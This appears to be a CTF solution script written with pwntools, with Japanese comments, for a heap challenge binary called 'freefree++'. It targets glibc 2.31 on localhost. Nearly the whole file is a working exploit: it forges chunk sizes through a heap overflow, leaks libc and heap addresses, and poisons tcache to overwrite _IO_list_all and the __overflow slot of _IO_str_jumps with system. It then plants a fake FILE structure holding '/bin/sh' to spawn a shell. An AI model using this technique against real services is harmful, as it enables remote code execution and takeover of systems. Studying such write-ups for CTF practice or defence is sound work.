from pwn import *

context.binary = 'freefree++'

s = remote('localhost', 10011)

def malloc(var, size):
  s.sendlineafter('> ', '%s=malloc(%s)'%(var, size))
def gets(var, data):
  s.sendlineafter('> ', 'gets(%s)'%var)
  s.sendline(data)
def puts(var):
  s.sendlineafter('> ', 'puts(%s)'%var)
  return s.recvline()[:-1]
def exit():
  s.sendlineafter('> ', 'exit(0)')

"""
+    0  290 tcache
+  290   20 setup()
+  2b0   20 A
+  2d0  d10 C
+  fe0   20 fenceposts
+ 1000    - dummy end
+21000  d20 B
+21d20  2c0 K'
+21fe0   20 fenceposts
+22000    - dummy end
+43000  d20 D
+43d20  2c0 J
+43fe0   20 fenceposts
+44000    - dummy end
+65000  d20 E
+65d20  2c0 I
+65fe0   20 fenceposts
+66000    - dummy end
+87000  d30 F
+87d30  2b0 M'
+87fe0   20 fenceposts
+88000    - dummy end
+a9000  d30 G
+a9d30  2b0 L
+a9fe0   20 fenceposts
+aa000    - dummy end
+cb000  2d0 H
"""

# unsortedのアドレスを取得して、libcのアドレスを計算
malloc('A', 0x10)
gets('A', b'a'*0x18+pack(0xd31))
malloc('B', 0xd10)
malloc('C', 0xd00)

unsorted = unpack(puts('C').ljust(8, b'\0'))
libc_base = unsorted-(0x1ebb80+0x60)
print("libc_base:", hex(libc_base))

# K', J, I, M', Lをtcacheに格納
gets('B', b'b'*0xd18+pack(0x2e1))
malloc('D', 0xd10)
gets('D', b'd'*0xd18+pack(0x2e1))
malloc('E', 0xd10)
gets('E', b'e'*0xd18+pack(0x2e1))
malloc('F', 0xd20)
gets('F', b'f'*0xd28+pack(0x2d1))
malloc('G', 0xd20)
gets('G', b'g'*0xd28+pack(0x2d1))
malloc('H', 0x2c0)

# Jのアドレスを取得して、ヒープのアドレスを計算
malloc('I', 0x2b0)
tcache = unpack(puts('I').ljust(8, b'\0'))
heap_base = tcache-0x43d30
print("heap_base:", hex(heap_base))

libc = ELF('libc-2.31.so')
libc.address = libc_base

_IO_str_jumps = libc.symbols._IO_file_jumps+0xc0

# Aのアドレスを_IO_list_allに書き込む
gets('D', b'd'*0xd18+pack(0x2c1)+pack(libc.symbols._IO_list_all))
malloc('J', 0x2b0)
malloc('K', 0x2b0)
gets('K', pack(heap_base+0x2c0))

# _IO_str_jumps.__overflowにsystemのアドレスを書き込む
gets('G',
  b'g'*0xd28 +
  pack(0x2b1) +
  pack(_IO_str_jumps+0x18)) # __overflow
malloc('L', 0x2a0)
malloc('M', 0x2a0)
gets('M', pack(libc.symbols.system))

# 細工したFILE構造体をAに書き込む
gets('A',
  b'/bin/sh\0' +        # +00 _flags
  b'\0'*0x20 +
  pack(1) +             # +28 _IO_write_ptr
  b'\0'*0xa8 +
  pack(_IO_str_jumps))  # +d8 vtable

exit()

s.interactive()
